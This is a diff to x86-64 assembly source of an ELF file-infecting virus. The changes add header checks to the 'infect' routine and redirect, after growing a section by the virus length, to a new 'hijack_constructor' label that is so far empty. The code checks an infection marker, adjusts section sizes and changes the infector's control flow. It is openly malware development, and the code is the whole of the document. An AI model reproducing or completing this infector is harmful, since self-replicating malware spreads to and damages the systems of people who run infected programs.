@@ -117,6 +117,12 @@ infect:
     jne     close_quit_infect
     cmp     [rax + EI_PAD], DWORD INFECTION_MAGIC
     je      close_quit_infect
+    mov     rdx, [rax + e_phnum]
+    test    rdx, rdx
+    je      close_quit_infect
+    mov     rdx, [rax + e_shnum]
+    test    rdx, rdx
+    je      close_quit_infect
     mov     ax, [rbx + e_type]
     cmp     ax, ET_EXEC
     je      right_type_check
@@ -216,16 +222,13 @@ loop_sections:
     cmp     r9, rdx
     jne     next_section
     add     QWORD [rbx + sh_size], virus_len
-    jmp     do_entrypoint_magic
+    jmp     hijack_constructor
 next_section:
     inc     r8
     cmp     r8w, [rax + e_shnum]
     add     bx, [rax + e_shentsize]
     jle     loop_sections
 
-do_entrypoint_magic:
-
-    jmp     munmap_quit_infect
 
 remap_and_infect_data:
     mov     edi, 1
@@ -233,6 +236,9 @@ remap_and_infect_data:
     mov     rdx, data_tmp_text.len
     mov     eax, SYS_WRITE
     syscall
+    
+hijack_constructor:
+
 
 munmap_quit_infect:
     mov     rdi, [rsp + 0x58]
